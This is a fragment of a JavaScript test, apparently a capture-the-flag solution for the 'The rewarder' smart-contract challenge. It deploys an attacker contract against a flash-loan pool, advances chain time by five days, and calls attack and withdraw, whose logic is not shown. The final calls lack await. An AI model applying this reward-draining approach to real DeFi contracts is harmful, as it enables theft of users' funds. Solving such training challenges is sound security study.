...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    // launch the attacker contract
    const TheRewarderPoolFactory = await ethers.getContractFactory(
      "RewarderAttacker"
    );

    const rewarderAttacker = await TheRewarderPoolFactory.deploy(
      this.flashLoanPool.address,
    ...
    const amt = await this.liquidityToken.balanceOf(this.flashLoanPool.address);

    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    rewarderAttacker.connect(attacker).attack(amt);

    rewarderAttacker.connect(attacker).withdraw();
  });
